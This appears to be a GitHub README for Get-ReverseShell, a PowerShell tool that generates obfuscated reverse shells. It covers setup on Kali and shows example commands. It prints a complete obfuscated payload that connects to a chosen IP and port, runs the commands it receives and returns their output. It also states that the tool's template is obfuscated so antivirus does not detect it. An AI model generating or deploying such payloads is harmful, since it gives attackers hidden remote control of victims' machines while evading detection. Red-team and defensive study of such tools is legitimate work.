# Obfuscated PowerShell Reverse Shells

Get-ReverseShell is a project that stems from the [Invoke-PSObfuscation](https://github.com/gh0x0st/invoke-psobfuscation) framework, with the sole purpose of producing obfuscated reverse shells for PowerShell. 

___IMPORTANT___

This tool has been built with the intent to be primarily supported on Kali Linux, however, you are still able to run this script on Windows just the same. While I encourage you to keep this script on Kali, I have added some safeguards for those that will store this on a system with antivirus installed, such as Windows with Defender enabled. 

This is due to the inclusion of a function called `Get-Template` that produces the reverse shell template that is passed through the generator functions. The original payload is prone to being detected across the board due to it's wide-spread popularity. 

To help prevent this function from flagging the entire script after being written to disk, the payload within `Get-Template` has been relatively obfuscated.

## Requirements

This script was built and tested on the following version Kali Linux and PowerShell. The obfuscated reverse shells are compatible on systems that support PowerShell newer than version 2.0

```shell
┌──(kali㉿kali)-[/home/kali]
└─PS> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      7.2.4
PSEdition                      Core
GitCommitId                    7.2.4
OS                             Linux 5.18.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07)
Platform                       Unix
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0…}
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
WSManStackVersion              3.0
```

## Usage Examples

To load the script on Kali Linux, open a terminal then run `pwsh`. With PowerShell now running in your terminal, you can load the script in your current session by __dot sourcing__ the script.

```shell
┌──(kali㉿kali)-[~]
└─$ pwsh
PowerShell 7.2.4
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

┌──(kali㉿kali)-[/home/kali]
└─PS> . ./Get-ReverseShell.ps1
```

If you run the script and supply only an IP address and port, then every supported script component will be obfuscated and output to the console.

```shell
┌──(kali㉿kali)-[/home/kali]
└─PS> Get-ReverseShell -Ip 127.0.0.1 -Port 443

     >> Layer 0 Reverse Shell
     >> https://github.com/gh0x0st

$9bu74RLxidUDk = & (("4us0Qpzt5b9navewiNEjqfxmZgRrSBKFW3JMVX2I8LDY6HACyTc7dOhkP-U1loG")[17,14,15,57,53,9,19,14,50,7] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_})(([string]::join('', ( (49,50,55,46,48,46,48,46,49) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_}),$(0+0-0-443+443+443));$kxjaLK6qrECXjf2 = ((& (("tFqYIQ1HnjmkK9PdoUbMzlCR27uv4yEpNxr85L-XSfWJhDiZTac3BGg6wesVOA0")[46,8,27,16,11,57,38,57,33,31,34,57,58,58,46,16,8] -join '')([string]::join('', ( (36,57,98,117,55,52,82,76,120,105,100,85,68,107,46,71,101,116,83,116,114,101,97,109,40,41) |%{ ( [char][int] $_)})) | % {$_})));[byte[]]$9uR0tN24DBEA9YsVNLOnIrx2s = 0..$($(0+60000)+$(0+0-0+5000)+(500)+($(35)))|%{;$_}|%{0};while(($5aH = $kxjaLK6qrECXjf2.Read($9uR0tN24DBEA9YsVNLOnIrx2s, 0, $9uR0tN24DBEA9YsVNLOnIrx2s.Length)) -ne 0){;$jIguPvaSK1ZilFymBVhTA = (& (("4us0Qpzt5b9navewiNEjqfxmZgRrSBKFW3JMVX2I8LDY6HACyTc7dOhkP-U1loG")[17,14,15,57,53,9,19,14,50,7] -join '') -TypeName ([string]::join('', ( (83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_})).GetString($9uR0tN24DBEA9YsVNLOnIrx2s,0, $5aH);$U = (& (("PljCFMKRq1-LpYeVWtNnku2Q8iJT0OzHg7Uxo5svyXh9GcAEawIb643dmfBSZrD")[50,19,39,36,20,14,10,47,35,12,61,14,38,38,25,36,19] -join '') $jIguPvaSK1ZilFymBVhTA 2>&1 |%{;$_}| & (("MTSO1XIqriP2ox4bGsuZtk0wEHhj9f8QnVdaBgcyLFN6Cz3DYWR-l5vUAmKJpe7")[3,18,20,51,2,20,8,9,32,37] -join '') );$GemSDxKaU = $U + $([char](30+87-30)+[char](97*72/97)+[char](106*65/106)+[char](21*84/21)+[char](0+32-0)+[char](88*87/88)+[char](0+72-0)+[char](0+69-0)+[char](0+82-0)+[char](51+69-51)+[char](80+62-80)+[char](42*32/42)) -replace $('W'+'H'+'E'+'R'+'E'),(& ([string]::join('', ( (71,101,116,45,76,111,99,97,116,105,111,110) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_})).Path -replace $([char](113*87/113)+[char](0+72-0)+[char](104*65/104)+[char](29+84-29)),([string]::join('', ( (80,83) |%{;$_}|%{ ( [char][int] $_)})) |%{;$_}| % {$_});$xz1V87nrk4C9g2omRSHwHrTU1 = ([text.encoding]::ASCII).GetBytes($GemSDxKaU);$kxjaLK6qrECXjf2.Write($xz1V87nrk4C9g2omRSHwHrTU1,0,$xz1V87nrk4C9g2omRSHwHrTU1.Length);$($kxjaLK6qrECXjf2.Flush())};$((& (("KDU-6exQHZgPzTYpVCvijL79Nf4du5ns2F3oym8WSrbGOE10tIqcAJlBwRMhXak")[19,30,18,35,62,5,3,5,6,15,41,5,31,31,19,35,30] -join '')([string]::join('', ( (36,57,98,117,55,52,82,76,120,105,100,85,68,107,46,67,108,111,115,101,40,41) |%{ ( [char][int] $_)})) | % {$_})))
```

In lieu of having the output sent to the console, we can also have the output saved to a file instead.

```shell
┌──(kali㉿kali)-[/home/kali]
└─PS> Get-ReverseShell -Ip 127.0.0.1 -Port 443 -OutFile obfuscated.ps1

     >> Layer 0 Reverse Shell
     >> https://github.com/gh0x0st

[*] Writing payload to obfuscated.ps1
```
